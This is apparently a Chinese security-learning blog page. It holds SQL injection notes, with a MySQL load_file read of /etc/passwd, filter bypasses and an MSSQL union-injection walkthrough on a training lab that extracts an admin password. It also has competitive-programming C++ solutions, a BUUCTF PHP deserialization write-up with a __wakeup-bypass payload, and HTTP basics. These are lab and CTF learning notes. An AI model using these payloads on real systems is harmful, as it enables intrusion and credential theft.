<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show global variables like <span class="string">&#x27;%secure_file_priv%&#x27;</span>;</span><br><span class="line">+------------------+-------+</span><br><span class="line">| Variable_name    | Value |</span><br><span class="line">+------------------+-------+</span><br><span class="line">| secure_file_priv |       |</span><br><span class="line">+------------------+-------+</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>Value</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>NULL</td>
<td>不允许导入或导出</td>
</tr>
<tr>
<td>&#x2F;tmp</td>
<td>只允许在 &#x2F;tmp 目录导入导出</td>
</tr>
<tr>
<td>空</td>
<td>不限制目录</td>
</tr>
</tbody></table>
<p>在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件</p>
<p>在 MySQL 5.5之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件</p>
<ul>
<li>文件读取</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="keyword">select</span> load_file(<span class="string">&#x27;/etc/passwd&#x27;</span>)\G;</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">load_file(<span class="string">&#x27;/etc/passwd&#x27;</span>): root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line"><span class="built_in">sync</span>:x:4:65534:<span class="built_in">sync</span>:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">libuuid:x:100:101::/var/lib/libuuid:</span><br><span class="line">syslog:x:101:104::/home/syslog:/bin/false</span><br><span class="line">mysql:x:102:105:MySQL Server,,,:/nonexistent:/bin/false</span><br><span class="line"></span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">ERROR:</span><br><span class="line">No query specified</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure>

<p>读取敏感信息：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_30292843/article/details/99381669">https://blog.csdn.net/weixin_30292843/article/details/99381669</a></p>
<p>如果存在过滤，比如说，把select替换为fuck，可以使用大写绕过过滤，写为Select，mysql对关键字大小写不敏感</p>
<p>select  * from user where name like ‘%qyw%’</p>
<p>那么前面带qyw或者后面带qyw的都会被搜出来</p>
<p>值传递的方式，get，post，cookie，request</p>
<p>cookie提交方式，抓包，添加数据</p>
<p>Cookie: 参数&#x3D;参数值</p>
<p>request是全部接受，用get，post或cookie都可以接受，我们大部分是黑盒测试，不知道对方代码是怎么写的，所以不知道接收数据时采用的是什么方法，如果采用的是request，那随便提交，如果是单一的，在注入时要使用到一些方法，有一些可以修改绕过提交方式</p>
<p>server提交方式，可以获取浏览器的一些值<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wangshuazi/p/9765012.html">$_SERVER详解 - 刷哥 - 博客园 (cnblogs.com)</a></p>
<h5 id="json注入"><a href="#json注入" class="headerlink" title="json注入"></a>json注入</h5><p>提交的时候写成这种</p>
<p>…</p>
<p>{</p>
<p>​	“username”:”admin”,</p>
<p>​	“password”:”123456”</p>
<p>}</p>
<p>或者直接抓个包，按那种格式提交数据</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/f61f381e-2c5b-4b0f-ac1d-a6e4b2c6561c" alt="image"></p>
<h5 id="Access注入"><a href="#Access注入" class="headerlink" title="Access注入"></a>Access注入</h5><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">数据库类型：Access、MySQL、SQL server、</span><br><span class="line">结构</span><br><span class="line">access</span><br><span class="line">	表名</span><br><span class="line">		列名</span><br><span class="line">			数据</span><br><span class="line">MySQL等</span><br><span class="line">	数据库名</span><br><span class="line">		表名</span><br><span class="line">			列名</span><br><span class="line">				数据</span><br><span class="line">我们进行sql注入时，用到的权限是由连接数据库的用户权限决定的</span><br><span class="line">access数据库在进行注入时，不需要union select，因为它只有一个数据库，直接查询信息就行，它也没有收集数据库名信息，表名信息的表，所以在就行注入时，就只能进行暴力猜</span><br><span class="line">1、判断有几列</span><br><span class="line">2、暴力猜</span><br><span class="line"></span><br><span class="line">遗留问题：</span><br><span class="line">access注入时，暴力破解如果列名或表名猜解不到</span><br></pre></td></tr></table></figure>

<h5 id="MSSQL（SQL-server）注入"><a href="#MSSQL（SQL-server）注入" class="headerlink" title="MSSQL（SQL server）注入"></a>MSSQL（SQL server）注入</h5><p>MSSQL注入 </p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xishaonian/p/6173644.html">https://www.cnblogs.com/xishaonian/p/6173644.html</a></p>
<p>例题为墨者学堂 SQL手工注入漏洞测试(Sql Server数据库)</p>
<p>解题步骤：</p>
<p><strong>1、判断是否是MSSQL</strong></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and exists (select * from sysobjects)--返回正常为mssql（也名sql server）</span><br><span class="line">and exists (select count(*) from sysobjects)--有时上面那个语句不行就试试这个哈</span><br></pre></td></tr></table></figure>

<p>sysobjects是sql server独有的一个数据库</p>
<p><strong>2、判断数据库版本</strong></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and 1=@@version--这个语句要在有回显的模式下才可以哦</span><br><span class="line">and substring((select @@version),22,4)=&#x27;2005&#x27;--适用于无回显模式，后面的2005就是数据库版本，返回正常就是2005的复制代码第一条语句执行效果图（类似）：第二条语句执行效果图：（如果是2005的话就返回正常）</span><br></pre></td></tr></table></figure>

<p><strong>3、判断回显</strong></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">由于题目中3是字符类型，所以要加引号</span><br><span class="line">?id=-2 union all select 1,2,&#x27;3&#x27;,4</span><br></pre></td></tr></table></figure>

<p><strong>4、数据库名称</strong></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-2 union all select 1,db_name(),&#x27;3&#x27;,4</span><br></pre></td></tr></table></figure>

<p>得到数据库名称为 mozhe_db_v2</p>
<p><strong>5、爆表</strong></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-2 union all select 1,(select top 1 name from mozhe_db_v2.dbo.sysobjects where xtype=&#x27;u&#x27;),&#x27;3&#x27;,4</span><br></pre></td></tr></table></figure>

<p>当xtype&#x3D;’U’ 代表是用户建立的表</p>
<p>得到表名为manage</p>
<p><strong>6、爆字段</strong></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-2 union all select 1,(select top 1 col_name(object_id(&#x27;manage&#x27;),1) from sysobjects),&#x27;3&#x27;,4</span><br></pre></td></tr></table></figure>

<p>解释一下col_name()，与object（）</p>
<p>object ()：数据库中每个对象都有一个唯一的id值，object_id(name)可以根据表对象名称得到表对象的ID，object_id()只能返回用户创建的对像的ID,像以sys开头的表都是系统表所以返回不了的</p>
<p>col_name（）：可以根据id值得到对像的名称，而且可以返回指定下标的结果.</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=-2 union all select 1,(select top 1 col_name(object_id(&#x27;manage&#x27;),2) from sysobjects),&#x27;3&#x27;,4 得username</span><br><span class="line"></span><br><span class="line">?id=-2 union all select 1,(select top 1 col_name(object_id(&#x27;manage&#x27;),3) from sysobjects),&#x27;3&#x27;,4 得password</span><br></pre></td></tr></table></figure>

<p>说明mange表总共有3列，分别为：id、username、password</p>
<p><strong>7、爆数据</strong></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-2 union all select 1,(select username from manage) ,(select password from manage where username in (&#x27;admin_mz&#x27;)),4</span><br></pre></td></tr></table></figure>

<p>得到username为admin_mz</p>
<p>password为72e1bfc3f01b7583，MD5解密，password为97285101</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/02/01/Web-SQLi2/" data-id="cls43dxy50000rkvfanov8qc7" data-title="SQLi2" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-20240131" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/01/31/20240131/" class="article-date">
  <time class="dt-published" datetime="2024-01-31T10:49:35.000Z" itemprop="datePublished">2024-01-31</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/01/31/20240131/">20240131</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h4 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h4><h5 id="202312-1-仓库规划"><a href="#202312-1-仓库规划" class="headerlink" title="202312-1 仓库规划"></a>202312-1 仓库规划</h5><p>题目链接：<a target="_blank" rel="noopener" href="http://118.190.20.162/view.page?gpid=T180">http://118.190.20.162/view.page?gpid=T180</a></p>
<p>用三层循环逐个比较</p>
<p>代码：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> M 12</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N 1005</span></span><br><span class="line"><span class="type">int</span> a[N][M];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> n,m;</span><br><span class="line">	cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line">	<span class="type">int</span> i,j,k;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;m;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			cin&gt;&gt;a[i][j];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="type">bool</span> p=<span class="literal">true</span>; <span class="comment">//判断有无上级仓库 </span></span><br><span class="line">		<span class="keyword">for</span>(j=<span class="number">1</span>;j&lt;=n;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="type">bool</span> pd=<span class="literal">true</span>;</span><br><span class="line">			<span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;m;k++)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span>(a[i][k]&gt;=a[j][k]) </span><br><span class="line">				&#123;</span><br><span class="line">					pd=<span class="literal">false</span>;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span>(pd) <span class="comment">//说明是上级仓库</span></span><br><span class="line">			&#123;</span><br><span class="line">				cout&lt;&lt;j&lt;&lt;endl;</span><br><span class="line">				p=<span class="literal">false</span>;</span><br><span class="line">				<span class="keyword">break</span>; <span class="comment">//只要上级最小的 </span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(p)</span><br><span class="line">		&#123;</span><br><span class="line">			cout&lt;&lt;<span class="number">0</span>&lt;&lt;endl;</span><br><span class="line">		&#125; </span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="202312-2-因子化简"><a href="#202312-2-因子化简" class="headerlink" title="202312-2 因子化简"></a>202312-2 因子化简</h5><p>题目链接：<a target="_blank" rel="noopener" href="http://118.190.20.162/view.page?gpid=T179">http://118.190.20.162/view.page?gpid=T179</a></p>
<p>对于待分解的数x，从小到大遍历所有可能的因数，可以被x整除就一直除以这个因数，直到x被分解完毕</p>
<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_74172965/article/details/135090693?spm=1001.2101.3001.6650.4&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-4-135090693-blog-135080223.235%5Ev43%5Epc_blog_bottom_relevance_base6&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-4-135090693-blog-135080223.235%5Ev43%5Epc_blog_bottom_relevance_base6&utm_relevant_index=9">CCF-CSP真题202312-2因子化简(C++满分题解)_202312-2 试题名称: 因子化简-CSDN博客</a></p>
<p>代码：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> LL;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> q;</span><br><span class="line">    cin&gt;&gt;q;</span><br><span class="line">    LL res;</span><br><span class="line">    LL n;</span><br><span class="line">    <span class="type">int</span> k;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;q;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        res=<span class="number">1</span>;</span><br><span class="line">        n=<span class="number">0</span>;</span><br><span class="line">        k=<span class="number">0</span>;</span><br><span class="line">        cin&gt;&gt;n;</span><br><span class="line">        cin&gt;&gt;k;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">2</span>;i&lt;=n/i;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> coef=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span>(n%i==<span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                n/=i;</span><br><span class="line">                coef++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//某项指数大于等于制定阈值k，此项才会保留，否则不计入结果</span></span><br><span class="line">            <span class="keyword">if</span>(coef&gt;=k) res*=<span class="built_in">pow</span>(i,coef);</span><br><span class="line">        &#125;</span><br><span class="line">        cout&lt;&lt;res&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Buuctf"><a href="#Buuctf" class="headerlink" title="Buuctf"></a>Buuctf</h4><h4 id="16-PHP"><a href="#16-PHP" class="headerlink" title="16 PHP"></a>16 PHP</h4><p>题目提示了备份网站</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/18c18833-30dc-498d-acf7-4095c042798c" alt="image"></p>
<p>使用目录扫描工具 dirsearch</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wuhongbin/p/14048052.html">目录扫描工具 dirsearch 使用详解 - FreeK0x00 - 博客园 (cnblogs.com)</a></p>
<p>可以直接到github上下载压缩包，解压后，进入目录运行cmd</p>
<p>首先安装dirsearch：<code>python setup.py install</code></p>
<p>如果报错，可能是因为pip版本太低，更新pip：<code>python -m pip install --upgrade pip</code></p>
<p>运行，开始扫描：<code>py -3.9 dirsearch.py -u http://15349308-86d1-4f57-8e2c-50b34e5d48eb.node4.buuoj.cn:81/ -e php</code></p>
<p>响应成功的如下图所示</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/523abcab-1ce7-4f1a-95e0-6c457c786dd0" alt="image"></p>
<p>访问<a target="_blank" rel="noopener" href="http://www.zip文件,下载了一个压缩包/">www.zip文件，下载了一个压缩包</a></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/c166170d-069f-4d99-acb4-e75a2c6ac3fc" alt="image"></p>
<p>（常见的黑客备份文件有<a target="_blank" rel="noopener" href="http://www.tar.gz和www.zip,尝试www.zip可直接得到文件)/">www.tar.gz和www.zip，尝试www.zip可直接得到文件）</a></p>
<p>解压得到一系列文件</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/9be93ca0-b413-4787-8b29-3115eec2be45" alt="image"></p>
<p>查看index.php文件，发现包含class.php文件，采用get传参select，还有个php反序列化函数unserialize()，所以这道题应该是PHP反序列化的题目。</p>
<p>所以页面可以传进一个参数<code>select</code>然后把它反序列化，反序列化的过程中会用到class.php</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/917331c7-3a19-4c6a-b5b8-2d08ca263360" alt="image"></p>
<p>查看class.php文件，有输出flag的条件</p>
<p>要调用到__destruct（）并且<code>password=100,username=admin</code>才能<code>echo $flag</code></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/ae9dc2e9-205f-41ab-916a-2d1f257c26ed" alt="image"></p>
<p>魔术方法，反序列化知识点可参考<a target="_blank" rel="noopener" href="https://dbqyw.github.io/2024/01/24/PHP/">https://dbqyw.github.io/2024/01/24/PHP/</a></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">在反序列化脚本结束时会自动调用它，它是unserialize()结束的魔术方法（魔法函数）</span><br><span class="line"></span><br><span class="line">魔术方法</span><br><span class="line">通常来说有一些PHP的魔法函数会导致反序列化漏洞，如：</span><br><span class="line">__construct 当一个对象创建时自动调用</span><br><span class="line">__destruct 当对象被销毁时自动调用 (php绝大多数情况下会自动调用销毁对象)</span><br><span class="line">__sleep() 使**用serialize()函数时触发</span><br><span class="line">__wakeup 使用unserialse()**函数时会自动调用</span><br><span class="line">__toString 当一个对象被当作一个字符串被调用。</span><br><span class="line">__call() 在对象上下文中调用不可访问的方法时触发</span><br><span class="line">__callStatic() 在静态上下文中调用不可访问的方法时触发</span><br><span class="line">__get() 用于从不可访问的属性读取数据//调用私有属性时使用</span><br><span class="line">__set() 用于将数据写入不可访问的属性</span><br><span class="line">__isset() 在不可访问的属性上调用isset()或empty()触发</span><br><span class="line">__unset() 在不可访问的属性上使用unset()时触发</span><br><span class="line">__toString() 把类当作字符串使用时触发,返回值需要为字符串</span><br><span class="line">__invoke() 当脚本尝试将对象调用为函数时触发</span><br></pre></td></tr></table></figure>

<p>构造序列化，php代码：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Name</span><br><span class="line">&#123;</span><br><span class="line">    private $username = &quot;yesyesyes&quot;;</span><br><span class="line">    private $password = &quot;nonono&quot;;</span><br><span class="line">    public function __construct($username,$password)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;username=$username;</span><br><span class="line">        $this-&gt;password=$password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new Name(@admin,100);</span><br><span class="line">//var_dump($a);</span><br><span class="line">//echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">$b = serialize($a);</span><br><span class="line">echo $b.&quot;&lt;br&gt;&quot;;//输出序列化</span><br><span class="line">echo urlencode($b);//输出url编码后的序列化</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>序列化后是这样的：</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/92a4085c-3183-425c-90bf-5175c5f4b940" alt="image"></p>
<p>调用unserialize()时会自动调用魔法函数wakeup(),可以通过改变属性数绕过，把Name后面的2改为3或以上即可</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Name&quot;:3:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure>

<p>然后url识别不了”，改为%22</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:%22Name%22:3:&#123;s:14:%22Nameusername%22;s:5:%22admin%22;s:14:%22Namepassword%22;i:100;&#125;</span><br></pre></td></tr></table></figure>

<p>因为成员（属性）是private，所以要在类名和成员名前加%00这个url编码是空的意思。因为生产序列化时不会把这个空也输出。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:%22Name%22:3:&#123;s:14:%22%00Name%00username%22;s:5:%22admin%22;s:14:%22%00Name%00password%22;i:100;&#125;</span><br></pre></td></tr></table></figure>


<p>完整payload：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?select=O:4:%22Name%22:3:&#123;s:14:%22%00Name%00username%22;s:5:%22admin%22;s:14:%22%00Name%00password%22;i:100;&#125;</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/ed749694-f9ae-4d63-a042-26d448f40f32" alt="image"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/01/31/20240131/" data-id="cls1fqbrd000058vfblbc7b66" data-title="20240131" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/learn/" rel="tag">learn</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-Web-Basic" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/01/31/Web-Basic/" class="article-date">
  <time class="dt-published" datetime="2024-01-31T06:16:00.000Z" itemprop="datePublished">2024-01-31</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/01/31/Web-Basic/">Web-Basic</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h4 id="HTTP基础知识"><a href="#HTTP基础知识" class="headerlink" title="HTTP基础知识"></a>HTTP基础知识</h4><h5 id="请求行"><a href="#请求行" class="headerlink" title="请求行"></a>请求行</h5><p>请求行由三个标记组成：请求方法、请求URL和HTTP版本，它们用空格分隔</p>
<p>例如：GET &#x2F;index.html HTTP&#x2F;1.1</p>
<p>HTTP规划定义了8中可能的请求方法</p>
<ul>
<li>GET：请求指定的页面信息，并返回实体主体</li>
<li>POST：向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST请求可能会导致新的资源的建立和&#x2F;或已有资源的修改</li>
<li>HEAD：类似于get请求，只不过返回的响应中没有具体的内容，用于获取报头，服务器只返回状态行和头标，不返回请求文档</li>
<li>PUT：从客户端向服务器传送的数据取代指定的文档的内容</li>
<li>DELETE：请求服务器删除指定的页面</li>
<li>OPTIONS：关于服务器支持的请求方法信息的请求</li>
<li>TRACE：web服务器反馈Http请求和其头标的请求</li>
<li>CONNECT：已文档化，但当前未实现的一个方法，预留做隧道处理</li>
</ul>
<h5 id="请求头"><a href="#请求头" class="headerlink" title="请求头"></a>请求头</h5><p>由关键字／值对组成，每行一对，关键字和值用冒号分隔，请求头标通知服务器用于客户端的功能和标识</p>
<ul>
<li>HOST:主机或域名地址</li>
<li>Accept:指浏览器或其他客户可以接受的MIME文件格式，Servlet可以根据它判断并返回适当的文件格式</li>
<li>User－Agent:是客户浏览器名称</li>
<li>Host:对应网址URL中的web名称和端口号</li>
<li>Accept－Language:指出浏览器可以接受的语言种类，如en或en－us，指英语</li>
<li>connection:用来告诉服务器是否可以维持固定的HTTP连接，http是无连接的，HTTP／１.１</li>
</ul>
